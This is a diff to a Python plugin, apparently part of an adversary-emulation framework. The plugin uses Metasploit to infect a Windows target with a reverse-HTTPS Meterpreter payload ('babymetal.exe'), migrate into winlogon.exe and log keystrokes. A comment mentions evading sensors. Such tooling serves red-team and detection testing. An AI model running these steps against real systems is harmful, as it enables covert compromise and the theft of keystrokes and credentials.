@@ -2,8 +2,7 @@
 
 # A plugin to nmap targets slow motion, to evade sensors
 
-from plugins.base.attack import AttackPlugin
-from app.metasploit import MetasploitInstant
+from plugins.base.attack import AttackPlugin, Requirement
 
 
 class MetasploitKeyloggingPlugin(AttackPlugin):
@@ -16,6 +15,8 @@ class MetasploitKeyloggingPlugin(AttackPlugin):
 
     required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
 
+    requirements = [Requirement.METASPLOIT]
+
     def __init__(self):
         super().__init__()
         self.plugin_path = __file__
@@ -27,19 +28,18 @@ class MetasploitKeyloggingPlugin(AttackPlugin):
         """
 
         res = ""
-        payload_type = "windows/meterpreter_reverse_https"
+        payload_type = "windows/x64/meterpreter/reverse_https"
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
-        metasploit = MetasploitInstant(self.metasploit_password,
-                                       attack_logger=self.attack_logger,
-                                       attacker=self.attacker_machine_plugin,
-                                       username=self.metasploit_user)
+        self.metasploit.smart_infect(target,
+                                     payload=payload_type,
+                                     outfile=payload_name,
+                                     format="exe",
+                                     architecture="x64")
 
-        metasploit.smart_infect(target, payload_type, payload_name, )
+        self.metasploit.migrate(target, name="winlogon.exe")
 
-        metasploit.migrate(target, name="winlogon.exe")
-
-        metasploit.keylogging(target, monitoring_time=20)
+        self.metasploit.keylogging(target, monitoring_time=20)
 
         return res
